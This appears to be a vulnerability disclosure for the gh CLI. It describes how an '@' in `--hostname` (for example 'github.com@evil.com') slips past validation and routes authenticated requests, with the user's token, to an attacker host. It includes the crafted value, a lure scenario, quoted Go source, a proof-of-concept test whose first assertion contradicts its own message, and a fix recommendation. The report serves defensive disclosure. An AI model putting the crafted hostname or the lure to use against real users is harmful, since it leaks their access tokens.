### Title
Host confusion via unvalidated `@` in `--hostname` sends auth token to attacker-controlled host - ([File: internal/ghinstance/host.go])

### Summary
`ghinstance.HostnameValidator` only rejects hostnames containing `/` or `:`, but does not reject `@`. Because `RESTPrefix`/`GraphQLEndpoint` build URLs by directly `fmt.Sprintf`-ing the raw hostname into the authority component of a URL string, a hostname like `github.com@evil.com` passes validation but is parsed by `net/url`/`net/http` as userinfo `github.com` at host `evil.com`, causing the `Authorization` header (containing the token being "validated") to be sent to `evil.com`.

### Finding Description
`HostnameValidator` in [1](#0-0)  only checks for `/` and `:` characters, leaving `@` unfiltered. `RESTPrefix` in [2](#0-1)  builds the REST endpoint by directly interpolating the raw, unvalidated hostname string into `https://api.%s/`. When `loginRun` is invoked with `--hostname github.com@evil.com --with-token`, the flag passes `HostnameValidator` in [3](#0-2) , then flows into `shared.HasMinimumScopes(httpClient, hostname, opts.Token)` and `shared.GetCurrentLogin(httpClient, hostname, opts.Token)` at [4](#0-3) . `GetScopes` builds the request URL via `safeurl.JoinPathWithHostPrefix(ghinstance.RESTPrefix(hostname))` and issues it with the `Authorization: token <token>` header at [5](#0-4) . Because `safeurl.JoinPathWithHostPrefix`/`joinPathWithHostPrefix` deliberately use the host prefix "as given" without further validation (only path components are percent-encoded) per its own documented contract in [6](#0-5) , the resulting string `https://api.github.com@evil.com/` is passed unmodified to `http.NewRequest`. Go's URL parser treats everything before the last `@` in the authority as userinfo and resolves the actual connection host to `evil.com`, not `github.com`. Neither `HostnameValidator` nor `safeurl` catches this because the userinfo-delimiter character `@` was never included in the hostname character blocklist.

### Impact Explanation
This causes credential exfiltration: the token supplied via `--with-token` is sent, embedded in the `Authorization` header, to an attacker-controlled origin (`evil.com`) during the very "scope validation" and "current login" requests, while `gh` believes it is talking to `github.com`/the intended enterprise host and proceeds to store the token under that hostname's config entry. This matches GitHub's bounty impact class of authenticated request routed to an attacker-controlled host / token disclosure.

### Likelihood Explanation
Exploitation requires the victim to run `gh auth login --hostname <attacker-supplied-string> --with-token` with a hostname value containing an embedded `@evil.com` suffix (e.g., copied from attacker-authored setup instructions in a README, issue, or documentation for a "custom GitHub Enterprise host"). Given that `--hostname` is a normal, expected CLI parameter for enterprise use cases, and the exact crafted string (`github.com@evil.com` or similar) passes the existing validator without any special exploitation of parsing edge cases, this is straightforward and repeatable once the victim is induced to type/paste the value.

### Recommendation
Harden `ghinstance.HostnameValidator` to reject any hostname component that is not a valid DNS hostname — reject `@`, whitespace, control characters, and ideally validate against `net/url.Parse` on the fully-constructed endpoint to ensure `url.Host` equals the originally supplied hostname (case-insensitively) before use. Additionally, consider having `safeurl.JoinPathWithHostPrefix` or its callers assert that the resulting parsed URL's `Host` matches the expected hostname as a defense-in-depth check before issuing any authenticated request.

### Proof of Concept
```go
func TestHostnameValidator_RejectsUserinfoHostConfusion(t *testing.T) {
    crafted := "github.com@evil.com"
    if err := ghinstance.HostnameValidator(crafted); err != nil {
        t.Fatalf("expected validator to reject %q, but it passed: no error", crafted)
    }

    endpoint := ghinstance.RESTPrefix(crafted) // "https://api.github.com@evil.com/"
    safeURL, _ := safeurl.JoinPathWithHostPrefix(endpoint)

    req, _ := http.NewRequest("GET", safeURL.String(), nil)
    parsed, _ := url.Parse(req.URL.String())

    // BUG: parsed.Host is "evil.com", not the intended "github.com"
    if parsed.Host == "evil.com" {
        t.Fatalf("request would be routed to attacker host %q instead of github.com", parsed.Host)
    }
}
```
Combine with `httpmock` registering a responder only for `evil.com` (or asserting `req.URL.Host` inside `httpClient.Do`) to demonstrate that `shared.GetScopes`/`shared.HasMinimumScopes` actually dispatches the `Authorization` header to the attacker host when `loginRun` is exercised with `--hostname github.com@evil.com --with-token`.

func HostnameValidator(hostname string) error {
	if len(strings.TrimSpace(hostname)) < 1 {
		return errors.New("a value is required")
	}
	if strings.ContainsRune(hostname, '/') || strings.ContainsRune(hostname, ':') {
		return errors.New("invalid hostname")
	}
	return nil
}

func RESTPrefix(hostname string) string {
	if isGarage(hostname) {
		return fmt.Sprintf("https://%s/api/v3/", hostname)
	}
	if ghauth.IsEnterprise(hostname) {
		return fmt.Sprintf("https://%s/api/v3/", hostname)
	}
	if strings.EqualFold(hostname, localhost) {
		return fmt.Sprintf("http://api.%s/", hostname)
	}
	return fmt.Sprintf("https://api.%s/", hostname)
}

// joinPathWithHostPrefix builds a full REST API URL by prepending hostPrefix to the path produced by
// JoinPath. A single slash is ensured at the join between hostPrefix and the path so they separate
// cleanly without doubling up. When hostPrefix is empty, the JoinPath result is returned intact, and
// when the joined path is empty, hostPrefix is returned intact. hostPrefix is used verbatim while each
// component is percent-encoded.
func joinPathWithHostPrefix(hostPrefix string, components ...string) string {
	path := joinPath(components...)
	if hostPrefix == "" {
		return path
	}
	if path == "" {
		return hostPrefix
	}
	if !strings.HasSuffix(hostPrefix, "/") {
		return hostPrefix + "/" + path
	}
	return hostPrefix + path
}
